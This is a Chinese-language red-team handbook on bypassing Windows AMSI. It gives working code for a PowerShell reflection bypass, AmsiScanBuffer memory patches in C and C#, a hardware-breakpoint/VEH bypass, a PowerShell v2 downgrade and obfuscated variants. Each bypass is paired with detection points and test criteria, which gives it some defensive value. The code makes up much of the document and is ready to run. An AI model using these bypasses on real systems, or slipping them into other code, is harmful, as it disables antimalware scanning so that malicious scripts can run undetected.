# AMSI Bypass Techniques — 完整代码模式手册

> 本文件为 `windows-av-evasion.md` §0 的伴生手册（补齐「详细代码模式/PowerShell/.NET」断链）。
> 覆盖 AMSI 各 bypass 的**原理 → 实现 → 检测侧对应点 → 实测判据**四段。
> 授权立场与检测侧配对纪律见 `refs/README.md`；`AMSI_ETW_BYPASS.md` 覆盖 AMSI+ETW 联合。

## 0. AMSI 工作流回顾（决定绕过点）

```
脚本/程序集 → amsi.dll!AmsiScanBuffer(IAmsiStream) → 供应商(Defender)引擎 → AMSI_RESULT
```

绕过点按「是否触碰代码完整性」分两类：
- **Patchless**（不改 `.text`）：改 `AmsiContext` 结构、改 `amsiInitFailed`、COM 重定向、HWBP。
- **Memory patch**（改 `.text`）：patch `AmsiScanBuffer` 首字节 `ret`。

---

## 1. Patchless — 修改 AmsiContext 指针

**原理**：`AmsiScanBuffer` 内部从 `HAMSICONTEXT` 解引用 context 结构，若 context 成员被改写为「空/无效」则提前返回 `S_OK`（视为干净），全程不 patch 代码。

```c
// 骨架示例：Patchless AMSI（改 context 成员，保守写法需按版本定位结构）
// 1) AmsiInitialize 拿 context
HAMSICONTEXT ctx = NULL;
HRESULT hr = AmsiInitialize(L"Scanner", &ctx);
// 2) context 是堆上结构，首部含函数指针表与状态；找到指向 "AmsiContext" 的字段
//    将其改写为 NULL 或指向一个伪造的干净 context，使后续 AmsiScanBuffer 短路
// 版本敏感：不同 Windows 版本 amsi.dll 的 context 布局不同，需动态定位（骨架示例）
```

**PowerShell 反射等价**（改 `amsiInitFailed` 标志，让 AMSI 初始化「假装失败」）：

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**检测侧**：AmsiContext 完整性校验（EDR 比对 context 结构指针合法性）；AMSI 会话遥测显示「scan skipped」异常。
**实测判据**：`AmsiInitialize` 成功但后续 `AmsiScanBuffer` 从不真正调用供应商引擎。

---

## 2. Memory Patch — AmsiScanBuffer 完整寻址

**原理**：定位 `amsi.dll!AmsiScanBuffer` 地址，把前几个字节 patch 成 `mov eax, AMSI_RESULT_CLEAN(0); ret`，使所有扫描返回干净。

```c
// 完整寻址 + patch（x64）
HMODULE hAmsi = LoadLibraryA("amsi.dll");
LPVOID pScan = GetProcAddress(hAmsi, "AmsiScanBuffer");

// patch 字节：x64 下常见做法
//  B8 00 00 00 00   mov eax, 0        (S_OK / AMSI_RESULT_CLEAN)
//  C3               ret
BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };

DWORD old;
VirtualProtect(pScan, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
memcpy(pScan, patch, sizeof(patch));
VirtualProtect(pScan, sizeof(patch), old, &old);
FlushInstructionCache(GetCurrentProcess(), pScan, sizeof(patch));
```

**硬编码偏移变体（跨版本不稳定，标注「骨架示例」）**：

```c
// 不同版本 amsi.dll 的 AmsiScanBuffer 内部布局不同，硬编码偏移仅作研究参考：
// 常见 patch 点：函数入口、或内部调用 AmsiScanBufferInternal 前的跳转处
// 生产用「GetProcAddress 定位 + 逐字节匹配特征」而非硬编码偏移
```

**检测侧**：`amsi.dll!AmsiScanBuffer` 首字节 ≠ 磁盘映像（内存完整性校验）；EDR 周期性重扫 AMSI 函数。
**实测判据**：`AmsiScanBuffer` 内存首字节为 `B8 00 00 00 00 C3`，而磁盘为正常序言。

---

## 3. COM 劫持 — AMSI COM Server 重定向

**原理**：AMSI 通过 COM 接口（`IAmsiStream`/`IAntimalwareProvider`）调用；在 HKCU 注册表把 AMSI 的 COM CLSID 重定向到攻击者实现（返回干净结果），或改 `InprocServer32` 指向伪造 DLL。

```powershell
# 骨架示例：COM 劫持思路（研究向，CLSID 按版本核实）
# AMSI 相关 COM 对象在 HKLM\SOFTWARE\Classes\CLSID\{...}\InprocServer32
# 劫持方式：HKCU 下写同名 CLSID + InprocServer32 指向攻击 DLL（HKCU 优先于 HKLM）
```

**检测侧**：注册表 CLSID `InprocServer32` 被改 + 异常 DLL 加载（Sysmon 7/12/13）；AMSI COM 加载路径校验。
**实测判据**：AMSI 初始化加载的 DLL 路径指向用户目录而非 `System32\amsi.dll`。

---

## 4. Hardware Breakpoint — DR0-DR7 + VEH

**原理**：在 `AmsiScanBuffer` 设硬件断点（DR0=地址，DR7 使能），VEH 捕获异常后改 `rax` 返回 `AMSI_RESULT_CLEAN`，不改任何代码字节。

```c
// 骨架示例：HWBP 绕过（VEH 改返回值）
LONG WINAPI VEH(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // 命中硬件断点：把 rax 改成 0（AMSI_RESULT_CLEAN），跳过原扫描
        ep->ContextRecord->Rax = 0;
        // 清除断点标志，恢复执行（单步绕过一次即可）
        ep->ContextRecord->EFlags &= ~0x100;   // 清 TF
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
// 设置：AddVectoredExceptionHandler -> SetThreadContext 写 DR0/DR7 使能断点
CONTEXT ctx = {0}; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
GetThreadContext(GetCurrentThread(), &ctx);
ctx.Dr0 = (DWORD64)pScan;                        // 断点地址 = AmsiScanBuffer
ctx.Dr7 = 0x1;                                   // 使能 DR0 局部断点
SetThreadContext(GetCurrentThread(), &ctx);
```

**检测侧**：线程调试寄存器 DR0-DR3 被设 + VEH 链异常（EDR 检测调试寄存器使用与异常处理改写）。
**实测判据**：`AmsiScanBuffer` 命中硬件断点且 VEH 改写返回值；`GetThreadContext` 显示 DR 寄存器非零。

---

## 5. PowerShell 专用 AMSI Bypass

### 5.1 PS v2 降级（无 AMSI）

```powershell
powershell -Version 2        # .NET 2.0 环境，PSv2 无 AMSI 集成
```

### 5.2 反射关闭（多版本通用族）

```powershell
# 反射改 amsiInitFailed（最常用）
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 变体：改 amsiContext 为 null
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiContext','NonPublic,Static').SetValue($null,$null)
```

### 5.3 字符串混淆触发词（避免静态命中 bypass 代码本身）

```powershell
$w = "Amsi" + "Utils"      # 拼接，规避「AmsiUtils」明文
$t = [Ref].Assembly.GetType("System.Management.Automation." + $w)
$t.GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)
```

**检测侧**：PowerShell 日志（4104 script block）中出现反射改 AMSI 字段的模式；EDR 监控 `amsiInitFailed` 访问。
**实测判据**：`AmsiUtils.amsiInitFailed` 被反射写入 `$true`；后续恶意脚本不再触发 AMSI 扫描。

---

## 6. .NET AMSI Bypass

**原理**：.NET 程序集加载也走 AMSI；绕过方式与 PowerShell 同源（反射改 `amsiInitFailed`），或 patch `AmsiScanBuffer`。

```csharp
// C# 反射改 amsiInitFailed（.NET）
var amsi = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");
var field = amsi?.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
field?.SetValue(null, true);
```

```csharp
// C# patch AmsiScanBuffer（.NET，P/Invoke）
[DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
var addr = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");
VirtualProtect(addr, 6, 0x40, out _);
Marshal.Copy(new byte[] { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }, 0, addr, 6);
```

**检测侧**：.NET 运行时加载前 AMSI 函数被 patch（与 PowerShell 同源的完整性校验）；ETW 的 .NET 加载事件缺失。
**实测判据**：`Assembly.Load` 恶意程序集时 AMSI 无扫描调用。

---

## 检测侧总表（回馈 attack-defense）

| 绕过方法 | 检测点 | 遥测/Sigma |
|---|---|---|
| Patchless（context/initFailed） | AmsiContext 完整性 + scan skipped | AMSI 会话遥测 |
| Memory patch | AmsiScanBuffer 首字节 ≠ 磁盘 | 内存完整性 + YARA `amsi-bypass-001` |
| COM 劫持 | CLSID InprocServer32 异常 | Sysmon 12/13 + 加载路径校验 |
| HWBP | DR0-DR3 非零 + VEH | 调试寄存器遥测 |
| PS v2 降级 | PowerShell 版本异常 | 4104 + 进程命令行 |
| PS 反射 | amsiInitFailed 反射写 | PowerShell 日志 + EDR |
| .NET 反射 | AMSI 初始化标志异常 | ETW .NET 加载遥测 |

## 实测判据对照

| 判据 | 判定方法 |
|---|---|
| AMSI 是否真正被绕过 | 投递已知恶意样本/字符串，观察供应商引擎是否被调用（可用 ETW/调试器断点） |
| 是否被检测 | EDR 完整性校验是否告警 `amsi.dll`/`AmsiScanBuffer` 漂移 |

*WARNING: 授权红队评估与安全研究专用。*
